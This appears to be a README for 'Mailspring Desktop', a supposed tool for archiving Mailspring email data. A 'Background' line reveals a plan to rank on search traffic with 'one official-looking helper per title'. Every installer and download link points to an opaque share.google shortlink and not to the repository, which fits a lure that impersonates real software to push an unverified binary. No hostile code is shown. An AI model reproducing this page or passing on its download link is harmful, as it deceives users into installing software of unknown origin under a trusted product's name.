![Mailspring Desktop](assets/hero.png)

# Mailspring Desktop

*Archive Mailspring files on this machine before you change the install.*

## What Mailspring Desktop is

This repository is **Mailspring Desktop**, a desktop utility. Archive Mailspring files on this machine before you change the install.

Patches move Mailspring data paths without warning.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Locates Mailspring user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Mailspring is the product name plus desktop.

Keep one official-looking helper per title.

## Environment

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```bash
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/a-jordan-8914/mailspring-desktop

MIT license. See `LICENSE`.
